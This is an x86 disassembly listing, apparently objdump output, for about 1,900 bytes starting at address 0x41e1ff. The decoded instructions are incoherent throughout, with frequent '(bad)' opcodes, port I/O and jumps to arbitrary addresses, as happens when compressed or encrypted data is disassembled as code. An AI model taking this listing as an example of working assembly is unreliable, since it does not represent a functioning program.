  41e1ff:	mov    ah,bh
  41e201:	add    edi,DWORD PTR [eax+0x4ae2c715]
  41e207:	(bad)  [ebp-0x6e]
  41e20a:	pop    es
  41e20b:	std    
  41e20c:	in     al,0xb3
  41e20e:	mov    esi,0xcaacd759
  41e213:	shl    BYTE PTR [ebp+0x70],cl
  41e216:	sub    eax,0x54fb2e52
  41e21b:	fcomp  QWORD PTR [eax+0x7e]
  41e21e:	push   edi
  41e21f:	mov    dl,BYTE PTR [ebx-0x719a949f]
  41e225:	mov    ds:0xed1b57ce,eax
  41e22a:	mov    eax,ds:0x98c544b4
  41e22f:	pop    esp
  41e230:	mov    esp,0x3d100c64
  41e235:	mov    esi,0x503c87f6
  41e23a:	sahf   
  41e23b:	mov    al,ds:0x4d9554c3
  41e240:	(bad)  
  41e241:	cli    
  41e242:	mov    ds:0xf33245b6,eax
  41e247:	fimul  DWORD PTR [eax]
  41e249:	imul   DWORD PTR [ecx+0x2f]
  41e24c:	jl     0x41e297
  41e24e:	pop    eax
  41e24f:	shl    DWORD PTR [eax-0x4b42b453],0x23
  41e256:	and    ebp,DWORD PTR [ebp-0x16]
  41e259:	icebp  
  41e25a:	outs   dx,BYTE PTR ds:[esi]
  41e25b:	int    0xf
  41e25d:	cmovns ebx,DWORD PTR [eax+eax*8]
  41e261:	lea    eax,[ecx+0x24]
  41e264:	inc    ebx
  41e265:	add    dh,BYTE PTR [esi-0x4]
  41e268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e269:	jbe    0x41e203
  41e26b:	xor    DWORD PTR [ebp+0x609d7ed8],ebx
  41e271:	push   cs
  41e272:	ja     0x41e22c
  41e274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e275:	lods   al,BYTE PTR ds:[esi]
  41e276:	sbb    al,0x82
  41e278:	xlat   BYTE PTR ds:[ebx]
  41e279:	dec    esi
  41e27a:	frstor [si-0x16]
  41e27e:	cmp    al,0x8b
  41e280:	(bad)  
  41e281:	daa    
  41e282:	cmp    bh,bh
  41e284:	jne    0x41e2dd
  41e286:	mov    bl,0x58
  41e288:	retf   0xaa68
  41e28b:	rol    DWORD PTR [ebx],0x45
  41e28e:	out    dx,eax
  41e28f:	lds    ecx,FWORD PTR fs:[ebx+0x47]
  41e293:	sahf   
  41e294:	push   esp
  41e295:	and    eax,0x6d17512f
  41e29a:	or     eax,0x4427ef2
  41e29f:	push   edi
  41e2a0:	inc    eax
  41e2a1:	push   ebx
  41e2a2:	jmp    0xaf86194b
  41e2a7:	adc    esp,DWORD PTR [esi]
  41e2a9:	in     eax,dx
  41e2aa:	addr16 in eax,0xa9
  41e2ad:	test   BYTE PTR [edi+0x20],bh
  41e2b0:	jmp    0x71c85d03
  41e2b5:	mov    ?,WORD PTR [edi-0x794a4e80]
  41e2bb:	sub    bh,BYTE PTR [ebx+0x543164f1]
  41e2c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2c2:	mov    WORD PTR [edx+0x3774f279],ds
  41e2c8:	arpl   di,bp
  41e2ca:	jno    0x41e252
  41e2cc:	jae    0x41e264
  41e2ce:	mov    ah,0x66
  41e2d0:	jne    0x41e311
  41e2d2:	mov    bl,0xea
  41e2d4:	adc    edi,DWORD PTR [edx+0x29]
  41e2d7:	shr    BYTE PTR [ecx],1
  41e2d9:	in     eax,0xa7
  41e2db:	sub    eax,0xb9b38fd3
  41e2e0:	fisttp DWORD PTR [eax+0x2499f3d]
  41e2e6:	out    0xb7,eax
  41e2e8:	add    BYTE PTR [ebx+eiz*2+0x0],0x3a
  41e2ed:	xlat   BYTE PTR ds:[ebx]
  41e2ee:	(bad)  
  41e2ef:	gs popa 
  41e2f1:	lea    ecx,[ecx-0x37]
  41e2f4:	adc    DWORD PTR [ecx-0x7c987c2b],ebp
  41e2fa:	cmp    BYTE PTR [edi],dh
  41e2fc:	gs pop edx
  41e2fe:	and    al,0xa
  41e300:	dec    ecx
  41e301:	jg     0x41e35e
  41e303:	lods   al,BYTE PTR ds:[esi]
  41e304:	jbe    0x41e306
	...
  41e30e:	add    BYTE PTR [eax],al
  41e310:	add    BYTE PTR [esi-0x9],ch
  41e313:	mov    ebx,0xfe6dbb69
  41e318:	not    DWORD PTR [edx+eax*1+0x31]
  41e31c:	pop    ecx
  41e31d:	dec    edx
  41e31e:	jmp    0x41e2ea
  41e320:	loopne 0x41e39f
  41e322:	pop    esi
  41e323:	add    DWORD PTR [eax],eax
  41e325:	lods   al,BYTE PTR ds:[esi]
  41e326:	add    eax,DWORD PTR [eax]
  41e328:	add    BYTE PTR [ebx+0x119f95dd],dl
  41e32e:	inc    eax
  41e32f:	dec    eax
  41e330:	jo     0x41e2d0
  41e332:	scas   eax,DWORD PTR es:[edi]
  41e333:	xchg   edx,eax
  41e334:	xor    edi,ebp
  41e336:	retf   0x92bc
  41e339:	dec    edx
  41e33a:	mov    eax,DWORD PTR [ebx-0x55a7e51]
  41e340:	xor    al,0xd6
  41e342:	cmc    
  41e343:	mov    bh,0xea
  41e345:	ins    BYTE PTR es:[edi],dx
  41e346:	imul   eax,edx,0xffffff9f
  41e349:	lahf   
  41e34a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e34b:	loopne 0x41e309
  41e34d:	test   BYTE PTR [ecx],cl
  41e34f:	or     dl,bl
  41e351:	jae    0x41e3cf
  41e353:	imul   esp,DWORD PTR [esi+0x30],0x54292c26
  41e35a:	pop    eax
  41e35b:	repnz cmp al,0x81
  41e35e:	or     eax,ecx
  41e360:	es sub ah,cl
  41e363:	cmp    bh,ch
  41e365:	mov    DWORD PTR [edi-0x28e4caba],eax
  41e36b:	(bad)  
  41e36c:	mov    ds:0xa2fdf8c5,eax
  41e371:	xchg   DWORD PTR [edi+ebp*2],edi
  41e374:	sub    eax,0x69cc2fad
  41e379:	sbb    DWORD PTR [edi+0x5921bdf0],esi
  41e37f:	adc    al,0x22
  41e381:	or     DWORD PTR [ebx],ebp
  41e383:	push   0xea435c1d
  41e388:	sbb    al,0xf5
  41e38a:	add    DWORD PTR [ebp-0x7e],0xffffffae
  41e38e:	aad    0x6d
  41e390:	add    al,0x6c
  41e392:	inc    edi
  41e393:	xlat   BYTE PTR ds:[ebx]
  41e394:	fst    DWORD PTR ds:0x87fba562
  41e39a:	retf   0xff6a
  41e39d:	xchg   esp,eax
  41e39e:	cmp    BYTE PTR [eax],bl
  41e3a0:	or     al,0x33
  41e3a2:	cmc    
  41e3a3:	mov    ah,0xb9
  41e3a5:	fcomi  st,st(0)
  41e3a7:	int3   
  41e3a8:	repz inc esp
  41e3aa:	inc    edx
  41e3ab:	sahf   
  41e3ac:	adc    BYTE PTR [edi-0x23],al
  41e3af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3b0:	xchg   ebp,eax
  41e3b2:	fs dec edi
  41e3b4:	dec    ecx
  41e3b5:	cli    
  41e3b6:	loopne 0x41e392
  41e3b8:	outs   dx,BYTE PTR ds:[esi]
  41e3b9:	dec    ebx
  41e3ba:	or     BYTE PTR [edx-0x531b758f],al
  41e3c0:	es inc edx
  41e3c2:	imul   BYTE PTR [eax]
  41e3c4:	push   eax
  41e3c5:	rcl    BYTE PTR [edi-0x39c233ee],0x73
  41e3cc:	mov    DWORD PTR [ebp-0x17],esp
  41e3cf:	les    edx,FWORD PTR [edx+edx*8-0x66b1923f]
  41e3d6:	in     eax,dx
  41e3d7:	push   ss
  41e3d8:	ret    0xad9c
  41e3db:	dec    eax
  41e3dc:	fwait
  41e3dd:	inc    esp
  41e3de:	out    dx,al
  41e3df:	mov    eax,ds:0x5e2418cf
  41e3e4:	fsubr  QWORD PTR [ebp-0x54]
  41e3e7:	fdivr  DWORD PTR ds:0xae325d41
  41e3ed:	call   0x940f546f
  41e3f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3f3:	fs (bad) 
  41e3f6:	jne    0x41e3ae
  41e3f8:	mov    cl,BYTE PTR [edi]
  41e3fa:	xchg   DWORD PTR [ebx],ebp
  41e3fc:	xor    al,0x8
  41e3fe:	call   0x86f2:0x2d39ae04
  41e405:	outs   dx,DWORD PTR ds:[esi]
  41e406:	jbe    0x41e39e
  41e408:	inc    esp
  41e409:	cmc    
  41e40a:	rcr    BYTE PTR [ebp+0x3],cl
  41e40d:	add    al,0x2d
  41e40f:	xor    ebp,esp
  41e411:	mov    fs,ecx
  41e413:	addr16 dec esp
  41e415:	retf   0xb90e
  41e418:	test   BYTE PTR [esi-0x3a],0xab
  41e41c:	pop    esp
  41e41d:	push   cs
  41e41e:	cmp    edx,esi
  41e420:	lock pop ebp
  41e422:	xor    ah,al
  41e424:	jb     0x41e3c5
  41e426:	pop    ebx
  41e427:	ret    0xc86c
  41e42a:	scas   al,BYTE PTR es:[edi]
  41e42b:	dec    eax
  41e42c:	cmp    DWORD PTR [edx],esp
  41e42e:	fdivr  DWORD PTR [ebx-0x6431d9c9]
  41e434:	dec    edx
  41e435:	repnz (bad) 
  41e437:	fwait
  41e438:	or     DWORD PTR [ebx+0x5de06be5],0x2caa3936
  41e442:	ja     0x41e4a0
  41e444:	gs pop eax
  41e446:	xor    BYTE PTR [esi],0x97
  41e449:	add    BYTE PTR [edi-0x1a],dh
  41e44c:	pop    ss
  41e44d:	mov    cl,0x53
  41e44f:	add    al,0xe7
  41e451:	sar    BYTE PTR [eax+ebx*8],cl
  41e454:	adc    eax,0xd8182d71
  41e459:	or     DWORD PTR [esi-0x35b0fe37],ecx
  41e45f:	adc    al,0x49
  41e461:	into   
  41e462:	push   esp
  41e463:	jge    0x41e485
  41e465:	cli    
  41e466:	mov    dh,0xd9
  41e468:	mov    ah,0xc4
  41e46a:	rcl    DWORD PTR [edi+0x19],cl
  41e46d:	pop    ebp
  41e46e:	in     eax,dx
  41e46f:	imul   eax,DWORD PTR [edx+eiz*8-0xde631c1],0x13
  41e477:	shl    DWORD PTR [ebp-0x1c],cl
  41e47a:	jmp    0xbc0d:0xaa8403a8
  41e481:	push   esi
  41e482:	mov    ds:0xb9d0ca93,al
  41e487:	mov    bh,0xc6
  41e489:	sbb    al,0xe1
  41e48b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e48c:	cmp    eax,0xb5191ac1
  41e491:	adc    cl,BYTE PTR [bx+di]
  41e494:	mov    dl,0x77
  41e496:	pushf  
  41e497:	lahf   
  41e498:	out    0xd8,eax
  41e49a:	adc    eax,0xc75ca653
  41e49f:	lods   eax,DWORD PTR ds:[esi]
  41e4a0:	ficomp WORD PTR [edi+0xc]
  41e4a3:	shl    BYTE PTR [ebp-0x59c6b54e],cl
  41e4a9:	xor    eax,0x7803f14d
  41e4ae:	xor    al,0x6b
  41e4b0:	aam    0x46
  41e4b2:	pop    esi
  41e4b3:	(bad)  
  41e4b4:	jmp    0x41e4d4
  41e4b6:	jo     0x41e4cc
  41e4b8:	xor    esp,edx
  41e4ba:	(bad)  
  41e4bb:	pop    ds
  41e4bc:	push   edi
  41e4bd:	mov    edx,0x14d8a425
  41e4c2:	jnp    0x41e50a
  41e4c4:	sbb    ch,dl
  41e4c6:	cld    
  41e4c7:	js     0x41e4ba
  41e4c9:	jg     0x41e4a9
  41e4cb:	mov    ah,0xec
  41e4cd:	mov    dl,0x7b
  41e4cf:	es data16 and al,0xd8
  41e4d3:	rcr    bh,1
  41e4d5:	shl    DWORD PTR [eax+0x1],0xb
  41e4d9:	xchg   ebp,eax
  41e4da:	pop    ebp
  41e4db:	in     eax,0x90
  41e4dd:	sub    DWORD PTR [ebp-0x59],edi
  41e4e0:	pushf  
  41e4e1:	div    BYTE PTR [esp+edi*1-0x21]
  41e4e5:	out    0xa3,eax
  41e4e7:	dec    ebx
  41e4e8:	daa    
  41e4e9:	scas   eax,DWORD PTR es:[edi]
  41e4ea:	ds aas 
  41e4ec:	loope  0x41e569
  41e4ee:	xchg   esi,eax
  41e4ef:	xchg   ebx,eax
  41e4f0:	xor    BYTE PTR [esi-0x3b80190c],0x92
  41e4f7:	fist   WORD PTR [eax]
  41e4f9:	fsubr  st,st(7)
  41e4fb:	loop   0x41e549
  41e4fd:	ss jmp 0xf364bedc
  41e503:	std    
  41e504:	(bad)  
  41e505:	fnstenv [edi]
  41e507:	ins    BYTE PTR es:[edi],dx
  41e508:	xor    eax,esp
  41e50a:	xor    cl,BYTE PTR [esi+0x23e0820f]
  41e510:	shr    BYTE PTR [edx+0x30],1
  41e513:	jle    0x41e4c2
  41e515:	push   ds
  41e516:	jg     0x41e556
  41e518:	pop    ebp
  41e519:	mov    ch,0x7c
  41e51b:	in     eax,dx
  41e51c:	fmulp  st(5),st
  41e51e:	inc    edx
  41e51f:	xor    si,WORD PTR [esi-0x5f0771eb]
  41e526:	ret    
  41e527:	mov    ah,0xc7
  41e529:	mov    ebx,0x52872699
  41e52e:	add    esi,DWORD PTR [edx]
  41e530:	leave  
  41e531:	or     eax,0x8df640eb
  41e536:	sbb    bh,BYTE PTR [ebx]
  41e538:	iret   
  41e539:	xor    bh,BYTE PTR [ebx-0x64]
  41e53c:	fist   DWORD PTR [edi]
  41e53e:	stos   DWORD PTR es:[edi],eax
  41e53f:	sub    dh,ch
  41e541:	pop    ebx
  41e542:	push   edx
  41e543:	popa   
  41e544:	in     eax,dx
  41e545:	shl    BYTE PTR [eax+0x4e],1
  41e548:	hlt    
  41e549:	or     DWORD PTR [edx+0x13],edx
  41e54c:	std    
  41e54d:	jne    0x41e545
  41e54f:	loop   0x41e4eb
  41e551:	jge    0x41e547
  41e553:	outs   dx,BYTE PTR ds:[esi]
  41e554:	jg     0x41e589
  41e556:	push   ebx
  41e557:	xchg   esp,eax
  41e558:	add    ebp,ecx
  41e55a:	xchg   esi,eax
  41e55b:	or     al,BYTE PTR [edi+ecx*1+0x2e]
  41e55f:	repz push ds
  41e561:	add    bh,BYTE PTR ds:0x24b02fd1
  41e567:	pop    esi
  41e568:	inc    edx
  41e569:	jle    0x41e57c
  41e56b:	mov    esp,0x40a58811
  41e570:	bound  esp,QWORD PTR [edx+0x48bcaa03]
  41e576:	outs   dx,BYTE PTR ds:[esi]
  41e577:	ins    BYTE PTR es:[edi],dx
  41e578:	mov    dh,0x23
  41e57a:	ret    0xc983
  41e57d:	shl    DWORD PTR [edx],cl
  41e57f:	add    dl,bh
  41e581:	or     DWORD PTR [esi+0x32bf66d7],edi
  41e587:	bound  edi,QWORD PTR [ecx+0x400da9ae]
  41e58d:	retf   
  41e58e:	fadd   QWORD PTR [eax-0x4d]
  41e591:	lock push ebp
  41e593:	sahf   
  41e594:	sti    
  41e595:	mov    ebp,0xd136dd61
  41e59a:	xchg   edx,eax
  41e59b:	xchg   esp,eax
  41e59c:	inc    esi
  41e59d:	jnp    0x41e5e9
  41e59f:	enter  0xcd14,0xf3
  41e5a3:	aas    
  41e5a4:	push   ebx
  41e5a5:	xchg   ebp,eax
  41e5a6:	outs   dx,DWORD PTR ds:[esi]
  41e5a7:	xchg   ebp,eax
  41e5a8:	cmp    DWORD PTR [esi+0x2836709],eax
  41e5ae:	gs pusha 
  41e5b0:	sbb    al,0x4c
  41e5b2:	adc    BYTE PTR [ecx-0x5d347e98],cl
  41e5b8:	cmp    BYTE PTR [eax+0x2c48b0bb],al
  41e5be:	scas   eax,DWORD PTR es:[edi]
  41e5bf:	rol    DWORD PTR [ecx+0x3d],1
  41e5c2:	rcr    DWORD PTR [ebp+edi*1+0x3d],cl
  41e5c6:	jecxz  0x41e5ae
  41e5c8:	push   edx
  41e5c9:	jp     0x41e57c
  41e5cb:	mov    WORD PTR [esi-0x4e1d7f79],?
  41e5d1:	outs   dx,DWORD PTR ds:[esi]
  41e5d2:	cmp    al,0x40
  41e5d4:	lods   al,BYTE PTR ds:[esi]
  41e5d5:	cmp    ebp,DWORD PTR [ecx+ecx*8]
  41e5d8:	mov    edi,ecx
  41e5da:	lds    edx,FWORD PTR [edx+0x75b287ff]
  41e5e0:	push   0xffffff85
  41e5e2:	mov    eax,0x5ff3a07e
  41e5e7:	out    0xbc,eax
  41e5e9:	les    esp,FWORD PTR [ecx+0x55e300ae]
  41e5ef:	dec    eax
  41e5f0:	cld    
  41e5f1:	outs   dx,BYTE PTR ds:[esi]
  41e5f2:	sub    ebp,esi
  41e5f4:	scas   al,BYTE PTR es:[edi]
  41e5f5:	add    dh,BYTE PTR [edx-0x2c]
  41e5f8:	mov    ebp,DWORD PTR [ebx-0x216d0e2b]
  41e5fe:	push   ds
  41e5ff:	push   es
  41e600:	out    dx,al
  41e601:	(bad)  
  41e602:	fcmovne st,st(3)
  41e604:	mov    ch,0xf9
  41e606:	pop    esi
  41e607:	popf   
  41e608:	fsub   st(7),st
  41e60a:	ja     0x41e62f
  41e60c:	or     al,BYTE PTR [edx-0x79d934ca]
  41e612:	add    BYTE PTR [ebx+0x66070605],0x28
  41e619:	in     al,0x44
  41e61b:	push   0x13b70d1e
  41e620:	mov    esp,0x3023f327
  41e625:	sub    BYTE PTR [edi+0x2],dl
  41e628:	mov    edi,ebx
  41e62a:	pop    ebp
  41e62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e62c:	(bad)  
  41e62e:	stos   DWORD PTR es:[edi],eax
  41e62f:	gs js  0x41e6ac
  41e632:	push   ebp
  41e633:	lods   al,BYTE PTR ds:[esi]
  41e634:	stos   BYTE PTR es:[edi],al
  41e635:	push   ss
  41e636:	cmp    DWORD PTR [ebx+0x61defdc5],edx
  41e63c:	dec    esi
  41e63d:	fisubr WORD PTR [ebx+0x55dda714]
  41e643:	cmp    al,0xb2
  41e645:	std    
  41e646:	sbb    eax,ecx
  41e648:	push   ebx
  41e649:	and    eax,0x1ca12ea9
  41e64e:	add    BYTE PTR [ebp+0x1f],cl
  41e651:	adc    al,0xda
  41e653:	lahf   
  41e654:	scas   eax,DWORD PTR es:[edi]
  41e655:	jmp    0x1191:0xa43aa216
  41e65c:	push   0x6e7399a9
  41e661:	(bad)  
  41e662:	mov    ch,0x36
  41e664:	popf   
  41e665:	add    dh,BYTE PTR [ebx+0x58e73d97]
  41e66b:	jns    0x41e621
  41e66d:	xchg   ebp,eax
  41e66e:	mov    eax,0xaf2c7f00
  41e673:	neg    DWORD PTR [edx]
  41e675:	or     al,0x67
  41e677:	inc    edi
  41e678:	sti    
  41e679:	ss int3 
  41e67b:	jg     0x41e6ba
  41e67d:	jo     0x41e60f
  41e67f:	and    al,0x1b
  41e681:	xchg   edi,eax
  41e682:	not    eax
  41e684:	pop    edx
  41e685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e686:	cmc    
  41e687:	cmp    DWORD PTR [esp+esi*4-0x5a],esp
  41e68b:	ins    BYTE PTR es:[edi],dx
  41e68c:	or     eax,0x65662042
  41e691:	loopne 0x41e6dc
  41e693:	push   esi
  41e694:	ins    BYTE PTR es:[edi],dx
  41e695:	cmp    al,0x29
  41e697:	mov    dl,0x33
  41e699:	fucom  st(3)
  41e69b:	ins    DWORD PTR es:[edi],dx
  41e69c:	adc    dh,al
  41e69e:	bnd jns 0x41e6fd
  41e6a1:	loopne 0x41e6c4
  41e6a3:	jno    0x41e700
  41e6a5:	in     eax,0xd
  41e6a7:	push   esi
  41e6a8:	push   esi
  41e6a9:	adc    al,0x75
  41e6ab:	les    ebx,FWORD PTR [ebp-0x21feda1d]
  41e6b1:	cdq    
  41e6b2:	jns    0x41e6c8
  41e6b4:	int3   
  41e6b5:	fdiv   QWORD PTR [esi-0x6d01db6a]
  41e6bb:	jmp    0x41e730
  41e6bd:	rol    cl,cl
  41e6bf:	ret    0xfb33
  41e6c2:	and    dl,BYTE PTR [edx+0x48]
  41e6c5:	mov    BYTE PTR ds:0xda3308ef,dh
  41e6cb:	sub    DWORD PTR [esi*8-0x19d86ad8],ebp
  41e6d2:	cs and esi,ebx
	...
  41e6e1:	sub    eax,0xfffb5fc4
  41e6e6:	sti    
  41e6e7:	lods   eax,DWORD PTR ds:[esi]
  41e6e8:	(bad)  
  41e6e9:	or     DWORD PTR [edi],ebp
  41e6eb:	jmp    0x6e63955d
  41e6f0:	sahf   
  41e6f1:	sub    DWORD PTR [edx+0x1],esp
  41e6f4:	add    BYTE PTR [ebx+eax*1-0x62050000],ch
  41e6fb:	stos   BYTE PTR es:[edi],al
  41e6fc:	mov    bh,0xb0
  41e6fe:	push   ebp
  41e6ff:	mov    esp,ds
  41e701:	scas   al,BYTE PTR es:[edi]
  41e702:	int    0x31
  41e704:	fwait
  41e705:	xchg   ebx,eax
  41e706:	cwde   
  41e707:	mov    edx,0xba4bfcd4
  41e70c:	in     al,dx
  41e70d:	mov    bh,0x38
  41e70f:	push   0x121ed055
  41e714:	adc    ah,al
  41e716:	jl     0x41e6ff
  41e718:	data16 ss (bad) 
  41e71b:	pop    ebx
  41e71c:	inc    ebx
  41e71d:	int3   
  41e71e:	sbb    dh,ah
  41e720:	iret   
  41e721:	xchg   BYTE PTR [ecx+0x61],dl
  41e724:	mov    bh,0xf8
  41e726:	inc    eax
  41e727:	or     cl,BYTE PTR [eax-0x627f27b4]
  41e72d:	fwait
  41e72e:	xchg   BYTE PTR [esp+esi*8+0x5c7c0e21],bl
  41e735:	rcr    BYTE PTR [eax-0x37f38bdf],0xe9
  41e73c:	out    0x53,al
  41e73e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e73f:	pop    es
  41e740:	cmp    edi,esi
  41e742:	(bad)  
  41e743:	mov    esp,0xeced15ed
  41e748:	mov    DWORD PTR [esi+0xff20d03],edi
  41e74e:	add    DWORD PTR [ecx+edi*1-0x4b5e3260],0x18
  41e756:	mov    ebx,0xb09fd418
  41e75b:	test   BYTE PTR [ebx-0x12],dl
  41e75e:	outs   dx,BYTE PTR ds:[esi]
  41e75f:	push   esi
  41e760:	ds clc 
  41e762:	outs   dx,DWORD PTR ss:[esi]
  41e764:	pop    esi
  41e765:	dec    ebp
  41e766:	lods   eax,DWORD PTR ds:[esi]
  41e767:	or     ch,al
  41e769:	push   edi
  41e76a:	and    al,0x17
  41e76c:	ds leave 
  41e76e:	lock retf 
  41e770:	test   al,0xf7
  41e772:	daa    
  41e773:	int3   
  41e774:	add    al,ch
  41e776:	sub    bh,BYTE PTR [edx+eiz*8-0x6123f7da]
  41e77d:	mov    ebx,0x9067c63e
  41e782:	in     al,dx
  41e783:	js     0x41e7ec
  41e785:	push   0x14569500
  41e78a:	or     al,bl
  41e78c:	push   ds
  41e78d:	mov    ebp,0xc6cc2054
  41e792:	push   ebx
  41e793:	sub    al,0xff
  41e795:	jecxz  0x41e7fb
  41e797:	pop    ecx
  41e798:	retf   
  41e799:	ds xor eax,0x633c3c1d
  41e79f:	jo     0x41e75c
  41e7a1:	xor    eax,0xe6f455d1
  41e7a6:	jle    0x41e7aa
  41e7a8:	pop    esi
  41e7a9:	sub    esi,DWORD PTR [eax-0x5b]
  41e7ac:	sub    BYTE PTR [esi-0x7d],bl
  41e7af:	mov    bh,BYTE PTR [edx*2-0x20639241]
  41e7b6:	jbe    0x41e77c
  41e7b8:	xchg   BYTE PTR ds:0x505d2289,cl
  41e7be:	sub    esi,DWORD PTR [eax]
  41e7c0:	data16 aas 
  41e7c2:	jb     0x41e824
  41e7c4:	push   ss
  41e7c5:	call   0xe82c97bf
  41e7ca:	xor    cl,bh
  41e7cc:	iret   
  41e7cd:	enter  0x1bac,0xf0
  41e7d1:	mov    DWORD PTR [edi+0x11],ebx
  41e7d4:	dec    esp
  41e7d5:	cmp    ah,BYTE PTR [edx+0x48]
  41e7d8:	popf   
  41e7d9:	push   edi
  41e7da:	push   esp
  41e7db:	inc    bl
  41e7dd:	out    0xed,al
  41e7df:	fiadd  DWORD PTR [edx]
  41e7e1:	dec    BYTE PTR [ecx-0x28]
  41e7e4:	sub    eax,0xd621f9dc
  41e7e9:	rcr    cl,1
  41e7eb:	aam    0x8e
  41e7ed:	push   esi
  41e7ee:	ins    BYTE PTR es:[edi],dx
  41e7ef:	pop    es
  41e7f0:	outs   dx,BYTE PTR ds:[esi]
  41e7f1:	or     DWORD PTR [edi-0x8],ebx
  41e7f4:	dec    eax
  41e7f5:	add    al,0xb9
  41e7f7:	mov    BYTE PTR [ebx],bh
  41e7f9:	add    DWORD PTR [edx+0x78],edx
  41e7fc:	jns    0x41e87d
  41e7fe:	stos   BYTE PTR es:[edi],al
  41e7ff:	mov    al,0xc1
  41e801:	xor    al,0xeb
  41e803:	mov    al,BYTE PTR [edi]
  41e805:	xor    DWORD PTR [eax],ebp
  41e807:	inc    esp
  41e808:	loopne 0x41e84d
  41e80a:	xchg   DWORD PTR [ebp+0x40],esp
  41e80d:	cld    
  41e80e:	and    DWORD PTR ds:[ebx+0x34],esi
  41e812:	and    BYTE PTR [esi],ah
  41e814:	jmp    0xf8347f97
  41e819:	sbb    DWORD PTR [ebx],edi
  41e81b:	pop    es
  41e81c:	fsubr  DWORD PTR [ebx+0x42]
  41e81f:	int    0x9b
  41e821:	ds xchg edi,eax
  41e823:	ins    BYTE PTR es:[edi],dx
  41e824:	ffreep st(7)
  41e826:	dec    edx
  41e827:	int3   
  41e828:	fwait
  41e829:	imul   DWORD PTR [edi-0x1b]
  41e82c:	sub    al,0xc0
  41e82e:	in     eax,0x8d
  41e830:	jge    0x41e822
  41e832:	into   
  41e833:	imul   esp,DWORD PTR [edi],0xebf8e804
  41e839:	call   0xf836:0xb45b91ef
  41e840:	fs in  eax,dx
  41e842:	call   0x1dac7a06
  41e847:	mov    ebp,0x8bedd4c
  41e84c:	icebp  
  41e84d:	lods   eax,DWORD PTR ds:[esi]
  41e84e:	outs   dx,BYTE PTR ds:[esi]
  41e84f:	and    eax,0xcec4147b
  41e854:	dec    ecx
  41e855:	mov    dl,ah
  41e857:	arpl   WORD PTR [ebx-0x583b91d8],si
  41e85d:	sbb    eax,DWORD PTR [edi]
  41e85f:	push   0x6f16940b
  41e864:	(bad)  [ebp+0x19cc9f10]
  41e86a:	mov    ah,0xed
  41e86c:	pop    eax
  41e86d:	lock (bad) [edi-0x144df8cc]
  41e874:	je     0x41e829
  41e876:	cs call 0x62ab:0x6efd9bb5
  41e87e:	push   0x5b
  41e880:	mov    dh,0x54
  41e882:	cmp    dh,BYTE PTR [ecx+0x6]
  41e885:	dec    ecx
  41e886:	mov    esp,0x6b9732d2
  41e88b:	es out dx,eax
  41e88d:	sub    al,0x51
  41e88f:	mov    esp,0xfe8296c0
  41e894:	xor    al,0x1b
  41e896:	sub    eax,0x5460a7ae
  41e89b:	and    eax,0x78b50d2d
  41e8a0:	adc    cl,BYTE PTR es:[edx+esi*2]
  41e8a4:	call   0xe647ece2
  41e8a9:	ds repz jl 0x41e901
  41e8ad:	sbb    BYTE PTR [ecx],bh
  41e8af:	mov    ebx,0x385c942e
  41e8b4:	ins    BYTE PTR es:[edi],dx
  41e8b5:	clc    
  41e8b6:	jnp    0x41e8cf
  41e8b8:	mov    edx,0x4e659f40
  41e8bd:	bound  eax,QWORD PTR [ecx-0x3a]
  41e8c0:	into   
  41e8c1:	lods   al,BYTE PTR ds:[esi]
  41e8c2:	(bad)  
  41e8c3:	lea    ebx,[edi]
  41e8c5:	(bad)  
  41e8c6:	scas   eax,DWORD PTR es:[edi]
  41e8c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8c8:	mov    ecx,0x5b6d8819
  41e8cd:	aad    0x53
  41e8cf:	into   
  41e8d0:	push   esi
  41e8d1:	jmp    0x3d4042a
  41e8d6:	int3   
  41e8d7:	jbe    0x41e8f3
  41e8d9:	and    al,ah
  41e8db:	fwait
  41e8dc:	xor    DWORD PTR [eax+0x21],ecx
  41e8df:	push   ebx
  41e8e0:	call   0xe13f:0xb788c830
  41e8e7:	xor    al,0x39
  41e8e9:	adc    DWORD PTR [ebp-0x72],edi
  41e8ec:	fnstenv [edi+0x1e500e55]
  41e8f2:	scas   al,BYTE PTR es:[edi]
  41e8f3:	(bad)  
  41e8f5:	push   ebx
  41e8f6:	cdq    
  41e8f7:	inc    edi
  41e8f8:	inc    edi
  41e8f9:	ret    
  41e8fa:	add    al,BYTE PTR [esp+edx*8+0x429a039a]
  41e901:	pushf  
  41e902:	fs hlt 
  41e904:	ficom  DWORD PTR [edi+esi*4-0x2286d4c2]
  41e90b:	dec    ebx
  41e90c:	push   ss
  41e90d:	mov    ebp,0x8d89132c
  41e912:	call   0xd94d:0x2af1bba7
  41e919:	mov    ds:0x6c41b00b,eax
  41e91e:	inc    ebx
  41e91f:	and    edi,DWORD PTR gs:[edi-0x37c9d676]
  41e926:	fstp   QWORD PTR ds:0x470ae7d7
  41e92c:	retf   0x70e5
  41e92f:	cli    
  41e930:	dec    esp
  41e931:	cmp    ebp,DWORD PTR ss:[ebp+0x22091f22]
  41e938:	push   0xfffffff5
  41e93a:	pop    edi
  41e93b:	aam    0xf8
  41e93d:	sub    al,0xe7
  41e93f:	out    dx,al
  41e940:	jmp    0x1eab:0x2127f0a6
  41e947:	mov    WORD PTR [edi+0x7a],es
  41e94a:	call   0xfb75ea25
  41e94f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e951:	lods   al,BYTE PTR ds:[esi]
  41e952:	mov    WORD PTR [ebp+0x22deed21],es
  41e958:	lods   al,BYTE PTR ds:[esi]
  41e959:	adc    BYTE PTR [edx+0x4daaa3f8],bh
  41e95f:	dec    esi
  41e960:	and    edi,DWORD PTR [esi+0x12]
  41e963:	jle    0x41e98d
  41e965:	in     eax,dx
  41e966:	outs   dx,BYTE PTR ds:[esi]
  41e967:	fwait
  41e968:	mov    edx,0xca51f38c
  41e96d:	je     0x41e99f
  41e96f:	add    edi,edx
  41e971:	bound  esi,QWORD PTR [ebx+esi*1]
